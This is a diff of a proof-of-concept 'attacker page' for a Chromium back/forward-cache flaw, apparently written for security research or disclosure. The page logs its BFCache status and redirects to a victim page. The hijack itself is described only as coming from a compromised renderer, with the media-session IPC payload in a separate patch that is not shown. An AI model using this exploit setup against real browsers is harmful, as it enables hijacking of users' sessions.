@@ -1,19 +1,58 @@
+```html
 <!doctype html>
 <meta charset="utf-8">
 <title>funny cat pictures</title>
-<style>body { font-family: sans-serif; background:#fee; }</style>
+
+<style>
+  body {
+    font-family: sans-serif;
+    background: #fee;
+  }
+</style>
+
 <h1>evil-bfcache.test</h1>
-<p>This is the attacker page (its renderer process is assumed compromised).</p>
-<p>Navigating this tab to the victim in 3 seconds… After navigation this
-document is stored in the back/forward cache, and the injected
-"compromised renderer" payload (see <code>chromium-changes.patch</code>,
-marker <code>bfhijack</code> in this URL) sends the media-session hijack IPCs
-over the frame's still-connected mojo pipes.</p>
+
+<p>
+  This is the attacker page (its renderer process is assumed compromised).
+</p>
+
+<p>
+  Navigating this tab to the victim in 3 seconds…
+</p>
+
+<p>
+  After navigation, this document may be stored in the back/forward cache.
+  In the vulnerable Chromium scenario, a compromised renderer may still be
+  able to send Media Session IPCs from the cached frame.
+</p>
+
+<h2>BFCache status</h2>
+<pre id="status">Waiting...</pre>
+
 <script>
-  // NOTE: this page deliberately does NOT touch navigator.mediaSession and
-  // does NOT play any media while alive. Everything happens after the
-  // document is already in the back/forward cache.
+  const status = document.getElementById("status");
+
+  window.addEventListener("pagehide", event => {
+    console.log("[ATTACKER] pagehide");
+    console.log("[ATTACKER] BFCache:", event.persisted);
+
+    status.textContent =
+      "pagehide\nBFCache: " + event.persisted;
+  });
+
+  window.addEventListener("pageshow", event => {
+    console.log("[ATTACKER] pageshow");
+    console.log("[ATTACKER] BFCache restore:", event.persisted);
+
+    status.textContent =
+      "pageshow\nBFCache restore: " + event.persisted;
+  });
+
   setTimeout(() => {
-    location.href = 'https://rhadityathinkpad-web.github.io/bfcache-poc/victim.html';
+    console.log("[ATTACKER] Navigating to victim...");
+
+    location.href =
+      "https://rhadityathinkpad-web.github.io/bfcache-poc/victim.html";
   }, 3000);
 </script>
+```
